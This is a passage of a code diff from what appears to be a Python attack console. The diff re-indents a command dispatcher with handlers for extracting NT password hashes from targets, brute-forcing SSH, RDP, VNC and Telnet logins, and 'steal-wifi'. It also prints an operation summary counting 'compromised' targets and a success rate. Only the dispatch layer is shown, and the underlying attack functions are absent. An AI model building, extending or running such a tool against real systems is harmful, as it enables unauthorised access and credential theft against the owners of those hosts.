-                self._log(f"{Fore.LIGHTGREEN_EX}  OPERATION COMPLETE")
-                self._log(f"{Fore.LIGHTGREEN_EX}  Total targets    : {total}")
-                self._log(f"{Fore.LIGHTGREEN_EX}  Compromised      : {compromised}")
-                self._log(f"{Fore.LIGHTGREEN_EX}  Success rate     : {int((compromised/total)*100) if total > 0 else 0}%")
-                self._log(f"{Fore.GREEN}╚════════════════════════════════════════════════════════════╝\n")
+                    self._log(f"\n{Fore.GREEN}╠════════════════════════════════════════════════════════════╣")
+                    self._log(f"{Fore.LIGHTGREEN_EX}  OPERATION COMPLETE")
+                    self._log(f"{Fore.LIGHTGREEN_EX}  Total targets    : {total}")
+                    self._log(f"{Fore.LIGHTGREEN_EX}  Compromised      : {compromised}")
+                    self._log(f"{Fore.LIGHTGREEN_EX}  Success rate     : {int((compromised/total)*100) if total > 0 else 0}%")
+                    self._log(f"{Fore.GREEN}╚════════════════════════════════════════════════════════════╝\n")
 
-            elif cmd == "nethashes":
-                target = args[0] if args else self.selected_target
-                if not target:
-                    print(f"{Fore.RED}[!] No target selected.")
-                    return
-                if self.control and hasattr(self.control, 'extract_nt_hashes'):
-                    hashes = self.control.extract_nt_hashes(target, self.credentials["user"], self.credentials["pass"])
-                    print(f"{json.dumps(hashes, indent=2)}")
+                elif cmd == "nethashes":
+                    target = args[0] if args else self.selected_target
+                    if not target:
+                        print(f"{Fore.RED}[!] No target selected.")
+                        return
+                    if self.control and hasattr(self.control, 'extract_nt_hashes'):
+                        hashes = self.control.extract_nt_hashes(target, self.credentials["user"], self.credentials["pass"])
+                        print(f"{json.dumps(hashes, indent=2)}")
 
-            elif cmd == "ssh-brute" and args:
-                if self.control and hasattr(self.control, 'ssh_brute'):
-                    result = self.control.ssh_brute(args[0])
-                    print(f"{json.dumps(result, indent=2)}")
+                elif cmd == "ssh-brute" and args:
+                    if self.control and hasattr(self.control, 'ssh_brute'):
+                        result = self.control.ssh_brute(args[0])
+                        print(f"{json.dumps(result, indent=2)}")
 
-            elif cmd == "rdp-brute" and args:
-                if self.control and hasattr(self.control, 'rdp_brute_force'):
-                    result = self.control.rdp_brute_force(args[0])
-                    print(f"{json.dumps(result, indent=2)}")
+                elif cmd == "rdp-brute" and args:
+                    if self.control and hasattr(self.control, 'rdp_brute_force'):
+                        result = self.control.rdp_brute_force(args[0])
+                        print(f"{json.dumps(result, indent=2)}")
 
-            elif cmd == "vnc-brute" and args:
-                if self.control and hasattr(self.control, 'vnc_brute_force'):
-                    result = self.control.vnc_brute_force(args[0])
-                    print(f"{json.dumps(result, indent=2)}")
+                elif cmd == "vnc-brute" and args:
+                    if self.control and hasattr(self.control, 'vnc_brute_force'):
+                        result = self.control.vnc_brute_force(args[0])
+                        print(f"{json.dumps(result, indent=2)}")
 
-            elif cmd == "telnet-brute" and args:
-                if self.control and hasattr(self.control, 'telnet_brute_force'):
-                    result = self.control.telnet_brute_force(args[0])
-                    print(f"{json.dumps(result, indent=2)}")
+                elif cmd == "telnet-brute" and args:
+                    if self.control and hasattr(self.control, 'telnet_brute_force'):
+                        result = self.control.telnet_brute_force(args[0])
+                        print(f"{json.dumps(result, indent=2)}")
 
-            elif cmd == "steal-wifi" or cmd == "steal_wifi":
+                elif cmd == "steal-wifi" or cmd == "steal_wifi":
                 target = args[0] if args else self.selected_target
                 if not target:
                     print(f"{Fore.RED}[!] No target selected. Use 'select <idx>' or 'steal-wifi <ip>'.")
